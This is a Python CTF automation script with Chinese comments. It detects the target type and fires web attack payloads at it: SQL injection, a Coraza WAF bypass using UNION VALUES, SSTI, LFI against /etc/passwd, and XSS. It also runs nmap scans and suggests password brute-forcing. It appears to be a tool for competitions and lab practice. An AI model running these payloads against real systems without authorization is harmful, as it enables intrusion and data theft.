#!/usr/bin/python3
"""
CTF智能自动化引擎 v7.0
自动识别目标类型 → 自动编排工具链 → 自动执行 → 自动提取Flag
适用于隔离网络内网环境
"""
import subprocess, os, re, json, time, sys, argparse
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════════
# 配置
# ═══════════════════════════════════════════════
TOOLKIT_DIR = "/root/ctf-toolkit"
LOOT_DIR = f"{TOOLKIT_DIR}/loot"
TIMEOUT = 30
MAX_WORKERS = 10

class TargetType(Enum):
    """目标类型枚举"""
    WEB = "web"
    SERVICE = "service"
    BINARY = "binary"
    CRYPTO = "crypto"
    MISC = "misc"
    GAME = "game"
    UNKNOWN = "unknown"

class VulnType(Enum):
    """漏洞类型枚举"""
    SQLI = "sqli"
    XSS = "xss"
    SSTI = "ssti"
    LFI = "lfi"
    CMDI = "cmdi"
    UPLOAD = "upload"
    JWT = "jwt"
    SSRF = "ssrf"
    IDOR = "idor"
    CORS = "cors"
    WAF_BYPASS = "waf_bypass"  # Coraza WAF绕过
    GAME_API = "game_api"      # 游戏题API
    PDF_LEAK = "pdf_leak"      # PDF泄露
    UNKNOWN = "unknown"

@dataclass
class CTFResult:
    """CTF解题结果"""
    target: str
    target_type: TargetType
    vuln_type: VulnType
    flag: Optional[str]
    evidence: str
    tool_used: List[str]
    success: bool
    details: Dict = field(default_factory=dict)

# ═══════════════════════════════════════════════
# 工具执行器
# ═══════════════════════════════════════════════
class ToolExecutor:
    """工具执行器 - 封装所有CTF工具"""
    
    def __init__(self):
        self.results = []
        
    def run(self, cmd: str, timeout: int = TIMEOUT) -> Tuple[str, int]:
        """执行命令并返回输出"""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, 
                text=True, timeout=timeout, cwd=TOOLKIT_DIR
            )
            return result.stdout + result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "TIMEOUT", -1
        except Exception as e:
            return str(e), -1
            
    def web_recon(self, url: str) -> Dict:
        """Web快速侦察"""
        print(f"[*] Web侦察: {url}")
        output, _ = self.run(f"bash {TOOLKIT_DIR}/web/recon.sh {url}")
        
        # 提取关键信息
        info = {
            "technologies": [],
            "endpoints": [],
            "vulns": [],
            "interesting": []
        }
        
        # 检测技术栈
        tech_patterns = [
            (r"PHP/[\d.]+", "PHP"),
            (r"Apache/[\d.]+", "Apache"),
            (r"nginx/[\d.]+", "Nginx"),
            (r"jQuery/[\d.]+", "jQuery"),
            (r"WordPress", "WordPress"),
            (r"Drupal", "Drupal"),
            (r"Laravel", "Laravel"),
            (r"Spring", "Spring"),
            (r"Django", "Django"),
            (r"Flask", "Flask"),
        ]
        
        for pattern, tech in tech_patterns:
            if re.search(pattern, output, re.I):
                info["technologies"].append(tech)
                
        # 检测端点
        endpoint_patterns = [
            r"href=\"(/[^\"]+)\"",
            r"action=\"(/[^\"]+)\"",
            r"src=\"(/[^\"]+)\"",
        ]
        
        for pattern in endpoint_patterns:
            matches = re.findall(pattern, output)
            info["endpoints"].extend(matches)
            
        # 检测漏洞迹象
        if ".git" in output.lower():
            info["vulns"].append("git_leak")
        if ".env" in output.lower():
            info["vulns"].append("env_leak")
        if "phpinfo" in output.lower():
            info["vulns"].append("phpinfo")
            
        return info
        
    def sqli_test(self, url: str, param: str = "id") -> bool:
        """SQL注入测试"""
        print(f"[*] SQL注入测试: {url}?{param}=")
        
        # 基本测试
        payloads = ["'", "\"", "')", "1' OR '1'='1"]
        for payload in payloads:
            output, code = self.run(
                f"curl -s --max-time 10 '{url}?{param}={payload}'"
            )
            if any(err in output.lower() for err in ["sql syntax", "mysql", "postgresql", "sqlite", "ora-"]):
                print(f"[+] SQL注入发现: {payload}")
                return True
                
        return False
        
    def union_values_bypass(self, url: str, param: str = "id") -> Optional[str]:
        """Coraza WAF绕过 - UNION VALUES"""
        print(f"[*] 测试Coraza WAF绕过: {url}")
        
        # 测试UNION VALUES
        payload = "x' UNION VALUES('test')--"
        output, code = self.run(
            f"curl -s --max-time 10 '{url}?{param}={payload}'"
        )
        
        if code == 200 and "test" in output:
            print("[+] Coraza WAF绕过成功!")
            
            # 提取数据库名
            db_payload = "x' UNION VALUES(current_database())--"
            output, _ = self.run(
                f"curl -s --max-time 10 '{url}?{param}={db_payload}'"
            )
            
            # 提取数字
            match = re.search(r'(\d{1,3})', output)
            if match:
                ascii_val = int(match.group(1))
                if 32 <= ascii_val <= 126:
                    return chr(ascii_val)
                    
        return None
        
    def ssti_test(self, url: str, param: str = "input") -> bool:
        """SSTI测试"""
        print(f"[*] SSTI测试: {url}")
        
        payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
        ]
        
        for payload, expected in payloads:
            output, _ = self.run(
                f"curl -s --max-time 10 '{url}?{param}={payload}'"
            )
            if expected in output:
                print(f"[+] SSTI发现: {payload}")
                return True
                
        return False
        
    def lfi_test(self, url: str, param: str = "page") -> bool:
        """LFI测试"""
        print(f"[*] LFI测试: {url}")
        
        payloads = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
        ]
        
        for payload in payloads:
            output, _ = self.run(
                f"curl -s --max-time 10 '{url}?{param}={payload}'"
            )
            if "root:" in output or "base64" in output.lower():
                print(f"[+] LFI发现: {payload}")
                return True
                
        return False
        
    def xss_test(self, url: str, param: str = "q") -> bool:
        """XSS测试"""
        print(f"[*] XSS测试: {url}")
        
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
        ]
        
        for payload in payloads:
            output, _ = self.run(
                f"curl -s --max-time 10 '{url}?{param}={payload}'"
            )
            if payload in output:
                print(f"[+] XSS发现: {payload}")
                return True
                
        return False
        
    def game_api_discover(self, url: str) -> Dict:
        """游戏API发现"""
        print(f"[*] 游戏API发现: {url}")
        
        endpoints = [
            "/game_state", "/game/status", "/api/game",
            "/move", "/move_manual", "/api/move",
            "/reset", "/reset_game", "/api/reset",
            "/get_flag", "/flag", "/api/flag",
        ]
        
        discovered = {}
        for endpoint in endpoints:
            output, code = self.run(
                f"curl -s --max-time 5 -o /dev/null -w '%{{http_code}}' '{url}{endpoint}'"
            )
            if code in [200, 405]:
                discovered[endpoint] = code
                print(f"[+] 发现游戏API: {endpoint} ({code})")
                
        return discovered
        
    def pdf_leak_check(self, url: str) -> List[str]:
        """PDF泄露检查"""
        print(f"[*] PDF泄露检查: {url}")
        
        flags = []
        
        # 查找PDF文件
        pdf_paths = ["/attachments/", "/files/", "/docs/", "/static/"]
        
        for path in pdf_paths:
            output, code = self.run(
                f"curl -s --max-time 10 '{url}{path}'"
            )
            
            # 提取PDF链接
            pdf_links = re.findall(r'href="([^"]*\.pdf)"', output, re.I)
            
            for pdf_link in pdf_links:
                if pdf_link.startswith("/"):
                    pdf_url = f"{url}{pdf_link}"
                else:
                    pdf_url = pdf_link
                    
                # 下载PDF
                pdf_output, _ = self.run(
                    f"curl -s --max-time 30 '{pdf_url}'"
                )
                
                # 提取flag
                flag_patterns = [
                    r"flag\{[^}]{3,80}\}",
                    r"FLAG\{[^}]{3,80}\}",
                    r"SAS\{[^}]{3,80}\}",
                    r"ctf\{[^}]{3,80}\}",
                ]
                
                for pattern in flag_patterns:
                    matches = re.findall(pattern, pdf_output, re.I)
                    flags.extend(matches)
                    
        return flags
        
    def extract_flags(self, text: str) -> List[str]:
        """从文本中提取flag"""
        patterns = [
            r"flag\{[^}]{3,80}\}",
            r"FLAG\{[^}]{3,80}\}",
            r"ctf\{[^}]{3,80}\}",
            r"CTF\{[^}]{3,80}\}",
            r"SAS\{[^}]{3,80}\}",
            r"key\{[^}]{3,80}\}",
            r"secret\{[^}]{3,80}\}",
            r"token\{[^}]{3,80}\}",
        ]
        
        flags = []
        for pattern in patterns:
            matches = re.findall(pattern, text, re.I)
            flags.extend(matches)
            
        return list(set(flags))

# ═══════════════════════════════════════════════
# 智能决策引擎
# ═══════════════════════════════════════════════
class DecisionEngine:
    """智能决策引擎 - 根据目标类型自动选择工具链"""
    
    def __init__(self):
        self.executor = ToolExecutor()
        
    def detect_target_type(self, target: str) -> TargetType:
        """检测目标类型"""
        print(f"[*] 检测目标类型: {target}")
        
        # Web URL检测
        if target.startswith(("http://", "https://")):
            return TargetType.WEB
            
        # 文件检测
        if os.path.isfile(target):
            # 二进制文件
            output, _ = self.executor.run(f"file {target}")
            if "ELF" in output or "PE32" in output:
                return TargetType.BINARY
                
            # 加密文件
            if any(ext in target.lower() for ext in [".enc", ".crypt", ".aes", ".rsa"]):
                return TargetType.CRYPTO
                
            # 游戏相关
            if any(ext in target.lower() for ext in [".pdf", ".doc", ".docx"]):
                return TargetType.MISC
                
        # IP/域名检测
        if re.match(r'^[\d.]+$', target) or '.' in target:
            return TargetType.SERVICE
            
        return TargetType.UNKNOWN
        
    def analyze_web_target(self, url: str) -> Dict:
        """分析Web目标"""
        print(f"\n{'='*60}")
        print(f"[*] 分析Web目标: {url}")
        print(f"{'='*60}")
        
        analysis = {
            "url": url,
            "type": TargetType.WEB,
            "technologies": [],
            "vulns": [],
            "flags": [],
            "tools_used": [],
            "recommendations": []
        }
        
        # Step 1: Web侦察
        print("\n[Step 1] Web侦察...")
        recon_info = self.executor.web_recon(url)
        analysis["technologies"] = recon_info["technologies"]
        analysis["tools_used"].append("web_recon")
        
        # Step 2: 检测泄露
        print("\n[Step 2] 检测敏感文件泄露...")
        if ".git" in str(recon_info.get("vulns", [])):
            analysis["vulns"].append("git_leak")
            analysis["recommendations"].append("使用git-dumper下载.git目录")
            
        if ".env" in str(recon_info.get("vulns", [])):
            analysis["vulns"].append("env_leak")
            analysis["recommendations"].append("检查.env文件获取敏感配置")
            
        # Step 3: PDF泄露检查
        print("\n[Step 3] 检查PDF泄露...")
        pdf_flags = self.executor.pdf_leak_check(url)
        if pdf_flags:
            analysis["flags"].extend(pdf_flags)
            analysis["vulns"].append("pdf_leak")
            print(f"[+] 发现PDF泄露的flag: {pdf_flags}")
            
        # Step 4: 根据技术栈选择测试策略
        print("\n[Step 4] 根据技术栈选择测试策略...")
        
        # SQL注入测试
        if any(tech in analysis["technologies"] for tech in ["PHP", "MySQL", "PostgreSQL", "SQLite"]):
            print("[*] 检测到数据库相关技术，测试SQL注入...")
            if self.executor.sqli_test(url):
                analysis["vulns"].append("sqli")
                
        # SSTI测试
        if any(tech in analysis["technologies"] for tech in ["Flask", "Jinja2", "Twig", "Smarty"]):
            print("[*] 检测到模板引擎，测试SSTI...")
            if self.executor.ssti_test(url):
                analysis["vulns"].append("ssti")
                
        # LFI测试
        print("[*] 测试文件包含...")
        if self.executor.lfi_test(url):
            analysis["vulns"].append("lfi")
            
        # XSS测试
        print("[*] 测试XSS...")
        if self.executor.xss_test(url):
            analysis["vulns"].append("xss")
            
        # Coraza WAF绕过测试
        print("\n[Step 5] 测试WAF绕过...")
        waf_result = self.executor.union_values_bypass(url)
        if waf_result:
            analysis["vulns"].append("waf_bypass")
            analysis["recommendations"].append("使用UNION VALUES绕过Coraza WAF")
            
        # 游戏API测试
        print("\n[Step 6] 检测游戏API...")
        game_apis = self.executor.game_api_discover(url)
        if game_apis:
            analysis["vulns"].append("game_api")
            analysis["recommendations"].append("使用游戏API自动化解题")
            
        return analysis
        
    def analyze_service_target(self, target: str) -> Dict:
        """分析服务目标"""
        print(f"\n{'='*60}")
        print(f"[*] 分析服务目标: {target}")
        print(f"{'='*60}")
        
        analysis = {
            "target": target,
            "type": TargetType.SERVICE,
            "ports": [],
            "services": [],
            "vulns": [],
            "flags": [],
            "tools_used": [],
            "recommendations": []
        }
        
        # 端口扫描
        print("\n[Step 1] 端口扫描...")
        output, _ = self.executor.run(
            f"nmap -sV --top-ports 1000 {target} 2>/dev/null | grep -E '^[0-9]+/tcp'"
        )
        
        for line in output.strip().split('\n'):
            if '/' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port = parts[0].split('/')[0]
                    service = parts[2]
                    analysis["ports"].append(port)
                    analysis["services"].append(f"{port}/{service}")
                    
        analysis["tools_used"].append("nmap")
        
        # 根据服务类型选择测试策略
        print("\n[Step 2] 根据服务类型选择测试策略...")
        
        for service_info in analysis["services"]:
            port, service = service_info.split('/')
            
            # Web服务
            if service in ["http", "https"]:
                print(f"[*] 发现Web服务: 端口{port}")
                web_url = f"http://{target}:{port}"
                web_analysis = self.analyze_web_target(web_url)
                analysis["vulns"].extend(web_analysis["vulns"])
                analysis["flags"].extend(web_analysis["flags"])
                
            # SSH服务
            elif service == "ssh":
                print(f"[*] 发现SSH服务: 端口{port}")
                analysis["recommendations"].append(f"SSH服务在端口{port}，尝试弱口令爆破")
                
            # FTP服务
            elif service == "ftp":
                print(f"[*] 发现FTP服务: 端口{port}")
                analysis["recommendations"].append(f"FTP服务在端口{port}，尝试匿名登录")
                
            # MySQL服务
            elif service == "mysql":
                print(f"[*] 发现MySQL服务: 端口{port}")
                analysis["recommendations"].append(f"MySQL服务在端口{port}，尝试弱口令爆破")
                
        return analysis
        
    def analyze_binary_target(self, target: str) -> Dict:
        """分析二进制目标"""
        print(f"\n{'='*60}")
        print(f"[*] 分析二进制目标: {target}")
        print(f"{'='*60}")
        
        analysis = {
            "target": target,
            "type": TargetType.BINARY,
            "protections": [],
            "vulns": [],
            "flags": [],
            "tools_used": [],
            "recommendations": []
        }
        
        # 保护检查
        print("\n[Step 1] 二进制保护检查...")
        output, _ = self.executor.run(f"checksec --file={target} 2>/dev/null || readelf -l {target} | grep GNU_STACK")
        
        if "NX disabled" in output or "RWE" in output:
            analysis["protections"].append("NX_OFF")
            analysis["recommendations"].append("NX未启用，可注入shellcode")
            
        if "Canary" not in output:
            analysis["protections"].append("NO_CANARY")
            analysis["recommendations"].append("无栈保护，可直接溢出")
            
        if "PIE" not in output:
            analysis["protections"].append("NO_PIE")
            analysis["recommendations"].append("无PIE，地址固定")
            
        analysis["tools_used"].append("checksec")
        
        # 字符串提取
        print("\n[Step 2] 提取字符串...")
        output, _ = self.executor.run(f"strings {target} | head -50")
        
        # 查找flag
        flags = self.executor.extract_flags(output)
        if flags:
            analysis["flags"].extend(flags)
            print(f"[+] 发现flag: {flags}")
            
        # 查找可疑字符串
        suspicious = ["flag", "password", "secret", "key", "admin", "root"]
        for s in suspicious:
            if s in output.lower():
                analysis["recommendations"].append(f"发现可疑字符串: {s}")
                
        analysis["tools_used"].append("strings")
        
        # 反汇编分析
        print("\n[Step 3] 反汇编分析...")
        output, _ = self.executor.run(f"objdump -d {target} | grep -A5 'main:' | head -20")
        
        if "system" in output or "execve" in output:
            analysis["vulns"].append("has_system_call")
            analysis["recommendations"].append("程序调用system/execve，可能存在命令执行")
            
        analysis["tools_used"].append("objdump")
        
        return analysis
        
    def analyze_crypto_target(self, target: str) -> Dict:
        """分析密码学目标"""
        print(f"\n{'='*60}")
        print(f"[*] 分析密码学目标: {target}")
        print(f"{'='*60}")
        
        analysis = {
            "target": target,
            "type": TargetType.CRYPTO,
            "encoding": [],
            "vulns": [],
            "flags": [],
            "tools_used": [],
            "recommendations": []
        }
        
        # 读取文件内容
        if os.path.isfile(target):
            with open(target, 'r', errors='ignore') as f:
                content = f.read()
        else:
            content = target
            
        # 检测编码
        print("\n[Step 1] 检测编码...")
        
        # Base64检测
        if re.match(r'^[A-Za-z0-9+/]*={0,2}$', content.strip()):
            analysis["encoding"].append("base64")
            analysis["recommendations"].append("内容可能是Base64编码")
            
        # Hex检测
        if re.match(r'^[0-9a-fA-F]+$', content.strip()):
            analysis["encoding"].append("hex")
            analysis["recommendations"].append("内容可能是Hex编码")
            
        # 尝试解码
        print("\n[Step 2] 尝试解码...")
        
        # Base64解码
        if "base64" in analysis["encoding"]:
            output, _ = self.executor.run(f"echo '{content}' | base64 -d")
            if output and not output.startswith("invalid"):
                decoded = output.strip()
                print(f"[+] Base64解码: {decoded[:50]}...")
                
                # 检查解码后是否包含flag
                flags = self.executor.extract_flags(decoded)
                if flags:
                    analysis["flags"].extend(flags)
                    
        # Hex解码
        if "hex" in analysis["encoding"]:
            output, _ = self.executor.run(f"echo '{content}' | xxd -r -p")
            if output:
                decoded = output.strip()
                print(f"[+] Hex解码: {decoded[:50]}...")
                
                flags = self.executor.extract_flags(decoded)
                if flags:
                    analysis["flags"].extend(flags)
                    
        analysis["tools_used"].extend(["base64", "xxd"])
        
        # RSA检测
        if "BEGIN RSA" in content or "BEGIN PUBLIC KEY" in content:
            analysis["encoding"].append("rsa")
            analysis["recommendations"].append("检测到RSA密钥，尝试RSA攻击")
            
        return analysis
        
    def analyze_misc_target(self, target: str) -> Dict:
        """分析Misc目标"""
        print(f"\n{'='*60}")
        print(f"[*] 分析Misc目标: {target}")
        print(f"{'='*60}")
        
        analysis = {
            "target": target,
            "type": TargetType.MISC,
            "file_type": "",
            "vulns": [],
            "flags": [],
            "tools_used": [],
            "recommendations": []
        }
        
        # 文件类型检测
        print("\n[Step 1] 文件类型检测...")
        output, _ = self.executor.run(f"file {target}")
        analysis["file_type"] = output.strip()
        analysis["tools_used"].append("file")
        
        # 根据文件类型选择处理方式
        print("\n[Step 2] 根据文件类型处理...")
        
        # PDF文件
        if "PDF" in output:
            print("[*] 检测到PDF文件...")
            output, _ = self.executor.run(f"strings {target} | grep -i 'flag\\|SAS\\|CTF'")
            flags = self.executor.extract_flags(output)
            if flags:
                analysis["flags"].extend(flags)
                print(f"[+] 从PDF提取到flag: {flags}")
                
        # 图片文件
        elif any(img in output for img in ["PNG", "JPEG", "GIF", "BMP"]):
            print("[*] 检测到图片文件...")
            output, _ = self.executor.run(f"exiftool {target} 2>/dev/null | grep -i 'comment\\|description\\|flag'")
            flags = self.executor.extract_flags(output)
            if flags:
                analysis["flags"].extend(flags)
                
            # LSB隐写检测
            output, _ = self.executor.run(f"zsteg {target} 2>/dev/null | head -20")
            flags = self.executor.extract_flags(output)
            if flags:
                analysis["flags"].extend(flags)
                analysis["vulns"].append("lsb_stego")
                
        # 压缩包
        elif any(zip_type in output for zip_type in ["Zip", "RAR", "gzip", "bzip2"]):
            print("[*] 检测到压缩包...")
            analysis["recommendations"].append("尝试解压或破解压缩包")
            
        # PCAP文件
        elif "pcap" in output.lower() or "capture" in output.lower():
            print("[*] 检测到流量包...")
            output, _ = self.executor.run(f"tshark -r {target} -Y 'tcp contains flag' 2>/dev/null | head -10")
            flags = self.executor.extract_flags(output)
            if flags:
                analysis["flags"].extend(flags)
                
        # 通用字符串提取
        print("\n[Step 3] 通用字符串提取...")
        output, _ = self.executor.run(f"strings {target} | grep -i 'flag\\|SAS\\|CTF\\|secret\\|key'")
        flags = self.executor.extract_flags(output)
        if flags:
            analysis["flags"].extend(flags)
            
        return analysis

# ═══════════════════════════════════════════════
# 自动化工作流引擎
# ═══════════════════════════════════════════════
class WorkflowEngine:
    """自动化工作流引擎"""
    
    def __init__(self):
        self.decision = DecisionEngine()
        self.results = []
        
    def auto_solve(self, target: str) -> CTFResult:
        """自动解题主入口"""
        print(f"\n{'='*60}")
        print(f"[*] CTF智能自动化引擎 v7.0")
        print(f"[*] 目标: {target}")
        print(f"{'='*60}")
        
        start_time = time.time()
        
        # Step 1: 检测目标类型
        target_type = self.decision.detect_target_type(target)
        print(f"[*] 目标类型: {target_type.value}")
        
        # Step 2: 根据类型选择分析策略
        if target_type == TargetType.WEB:
            analysis = self.decision.analyze_web_target(target)
        elif target_type == TargetType.SERVICE:
            analysis = self.decision.analyze_service_target(target)
        elif target_type == TargetType.BINARY:
            analysis = self.decision.analyze_binary_target(target)
        elif target_type == TargetType.CRYPTO:
            analysis = self.decision.analyze_crypto_target(target)
        elif target_type == TargetType.MISC:
            analysis = self.decision.analyze_misc_target(target)
        else:
            print("[-] 无法识别目标类型")
            return CTFResult(
                target=target,
                target_type=TargetType.UNKNOWN,
                vuln_type=VulnType.UNKNOWN,
                flag=None,
                evidence="无法识别目标类型",
                tool_used=[],
                success=False
            )
            
        # Step 3: 汇总结果
        elapsed = time.time() - start_time
        
        print(f"\n{'='*60}")
        print(f"[*] 分析完成 (耗时: {elapsed:.1f}秒)")
        print(f"{'='*60}")
        
        # 打印发现的漏洞
        if analysis.get("vulns"):
            print(f"\n[!] 发现的漏洞 ({len(analysis['vulns'])}个):")
            for vuln in set(analysis["vulns"]):
                print(f"  - {vuln}")
                
        # 打印发现的flag
        if analysis.get("flags"):
            print(f"\n[+] 发现的flag ({len(analysis['flags'])}个):")
            for flag in set(analysis["flags"]):
                print(f"  - {flag}")
                
        # 打印建议
        if analysis.get("recommendations"):
            print(f"\n[*] 建议 ({len(analysis['recommendations'])}个):")
            for rec in analysis["recommendations"]:
                print(f"  - {rec}")
                
        # 打印使用的工具
        if analysis.get("tools_used"):
            print(f"\n[*] 使用的工具: {', '.join(set(analysis['tools_used']))}")
            
        # 保存结果
        result = CTFResult(
            target=target,
            target_type=target_type,
            vuln_type=VulnType.UNKNOWN,
            flag=analysis["flags"][0] if analysis.get("flags") else None,
            evidence=json.dumps(analysis, ensure_ascii=False, indent=2),
            tool_used=analysis.get("tools_used", []),
            success=bool(analysis.get("flags")),
            details=analysis
        )
        
        self.results.append(result)
        
        # 保存到文件
        self.save_result(result)
        
        return result
        
    def save_result(self, result: CTFResult):
        """保存结果到文件"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        target_dir = f"{LOOT_DIR}/auto/{timestamp}_{result.target.replace('/', '_').replace(':', '_')}"
        os.makedirs(target_dir, exist_ok=True)
        
        # 保存详细结果
        with open(f"{target_dir}/analysis.json", "w") as f:
            json.dump({
                "target": result.target,
                "target_type": result.target_type.value,
                "flag": result.flag,
                "success": result.success,
                "tool_used": result.tool_used,
                "details": result.details
            }, f, ensure_ascii=False, indent=2)
            
        # 保存flag
        if result.flag:
            with open(f"{target_dir}/flag.txt", "w") as f:
                f.write(result.flag)
                
        print(f"\n[*] 结果已保存: {target_dir}")
        
    def batch_solve(self, targets: List[str]) -> List[CTFResult]:
        """批量解题"""
        print(f"\n[*] 批量解题: {len(targets)}个目标")
        
        results = []
        
        for i, target in enumerate(targets, 1):
            print(f"\n[{i}/{len(targets)}] 处理目标: {target}")
            result = self.auto_solve(target)
            results.append(result)
            
        # 汇总统计
        print(f"\n{'='*60}")
        print(f"[*] 批量解题完成")
        print(f"{'='*60}")
        
        success_count = sum(1 for r in results if r.success)
        print(f"[*] 总计: {len(results)}个目标")
        print(f"[+] 成功: {success_count}个")
        print(f"[-] 失败: {len(results) - success_count}个")
        
        if success_count > 0:
            print(f"\n[+] 成功提取的flag:")
            for r in results:
                if r.flag:
                    print(f"  {r.target}: {r.flag}")
                    
        return results

# ═══════════════════════════════════════════════
# 主入口
# ═══════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="CTF智能自动化引擎 v7.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python3 auto_ctf.py http://target.com           # 自动分析Web目标
  python3 auto_ctf.py 192.168.1.100               # 自动分析服务目标
  python3 auto_ctf.py ./challenge.elf              # 自动分析二进制
  python3 auto_ctf.py ./encrypted.txt              # 自动分析密码学
  python3 auto_ctf.py ./challenge.pdf              # 自动分析Misc
  python3 auto_ctf.py -b targets.txt               # 批量解题
  
支持的目标类型:
  - Web URL (http://, https://)
  - IP地址/域名
  - 二进制文件 (ELF, PE)
  - 加密文件
  - Misc文件 (PDF, 图片, 压缩包, 流量包)
  
自动检测并执行:
  - Web侦察 (技术栈/端点/泄露)
  - SQL注入测试
  - SSTI测试
  - LFI测试
  - XSS测试
  - Coraza WAF绕过
  - 游戏API发现
  - PDF泄露检测
  - 二进制保护检查
  - 编码检测与解码
  - 隐写分析
  - Flag自动提取
        """
    )
    
    parser.add_argument("target", nargs="?", help="目标URL/IP/文件")
    parser.add_argument("-b", "--batch", help="批量目标文件")
    parser.add_argument("-o", "--output", help="输出目录")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--timeout", type=int, default=30, help="超时时间")
    
    args = parser.parse_args()
    
    # 创建输出目录
    if args.output:
        os.makedirs(args.output, exist_ok=True)
        
    # 初始化引擎
    engine = WorkflowEngine()
    
    # 批量模式
    if args.batch:
        if not os.path.isfile(args.batch):
            print(f"[-] 批量目标文件不存在: {args.batch}")
            sys.exit(1)
            
        with open(args.batch, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
        engine.batch_solve(targets)
        
    # 单目标模式
    elif args.target:
        engine.auto_solve(args.target)
        
    else:
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()
